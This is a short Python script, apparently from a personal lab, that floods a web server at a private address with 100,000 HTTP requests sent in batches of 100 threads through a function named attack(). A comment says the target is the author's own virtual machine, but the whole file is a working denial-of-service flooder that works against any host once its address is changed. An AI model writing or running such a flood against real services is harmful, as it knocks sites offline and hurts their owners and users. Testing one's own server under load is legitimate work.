import sys
import threading
from urllib.request import urlopen

# number of request
num_requests = 100000


# Perform the request
def attack():
    # I host my website in a virtual machine which is connected to a virtual network
    x = urlopen('http://192.168.56.101:3000/')


# send requets in groups to prevent run out of threads
for k in range(int(num_requests/100)):
    # Spawn a thread per request
    all_threads = []
    for i in range(100):
        t1 = threading.Thread(target=attack)
        t1.start()
        all_threads.append(t1)

    for current_thread in all_threads:
        current_thread.join()  # Make the main thread wait for the children threads
